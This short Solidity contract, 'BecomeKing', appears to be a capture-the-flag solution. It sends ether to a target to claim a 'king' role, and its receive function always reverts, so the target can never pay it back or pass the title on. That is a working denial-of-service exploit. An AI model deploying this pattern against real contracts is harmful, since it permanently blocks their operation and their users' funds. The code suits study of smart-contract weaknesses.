// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract BecomeKing {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function sendEther(address payable _dest) public payable {
        // Add ether when invoking a contract
        (bool sent, ) = _dest.call{value: address(this).balance}("");
        require(sent, "Failed to send ether!");
    }

    receive () external payable {
        revert('Thanks, but NOPE');
    }
}